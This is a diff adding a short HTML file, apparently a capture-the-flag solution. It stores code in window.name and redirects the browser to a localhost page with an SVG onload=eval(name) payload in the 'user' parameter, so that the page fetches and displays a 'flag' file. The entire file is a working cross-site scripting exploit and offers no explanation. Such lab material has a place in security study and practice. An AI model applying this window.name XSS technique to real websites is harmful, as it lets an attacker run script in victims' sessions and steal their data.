@@ -1,0 +1,9 @@
+<html>
+
+<script>
+    // https://tinyxss.terjanq.me/
+    name="fetch('flag').then(e=>e.text()).then(alert)";
+    location = 'http://localhost:8887/?user=%3Csvg%20onload=eval(name)%3E';
+</script>
+
+</html>
